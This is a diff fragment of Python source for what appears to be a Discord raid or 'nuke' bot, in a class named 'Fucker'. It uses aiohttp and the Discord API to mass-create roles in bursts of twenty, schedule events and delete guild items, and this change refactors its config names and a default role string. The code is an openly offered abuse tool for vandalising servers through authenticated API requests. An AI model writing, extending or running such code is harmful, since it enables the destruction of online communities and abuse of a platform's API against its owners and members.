@@ -3,8 +3,7 @@ from datetime import datetime, timedelta
 
 from aiohttp import ClientSession
 
-from core.config.config import (CHNAME, EVENT_NAME, LINKSERV, ROLENAME, TEXT,
-                                 headers)
+from core.config.config import (CHNAME,  LINKSERV, TEXT, headers, NAME)
 from core.tasks import create_tasks, request
 
 
@@ -43,7 +42,7 @@ class Fucker:
             await create_tasks(urls, session.post, self.headers, json)
 
     async def create_event(self, ctx):
-        name = EVENT_NAME
+        name = NAME
         time = (datetime.now() + timedelta(days=30)).isoformat()
         json = {
             "channel_id": None,
@@ -85,11 +84,11 @@ class Fucker:
         async with ClientSession(headers=self.headers, connector=None) as session:
             await create_tasks(urls, session.delete, self.headers)
 
-    async def crRoles(self, ctx, name="Voidteamfuckyo"):
+    async def crRoles(self, ctx, name=f"{NAME}teamfuckyo"):
         urls = [
             f"https://discord.com/api/v8/guilds/{self.ctx.guild.id}/roles"
             for _ in range(20)
         ]
-        json = {"name": ROLENAME}
+        json = {"name": NAME}
         async with ClientSession(headers=self.headers, connector=None) as session:
             await create_tasks(urls, session.post, self.headers, json)
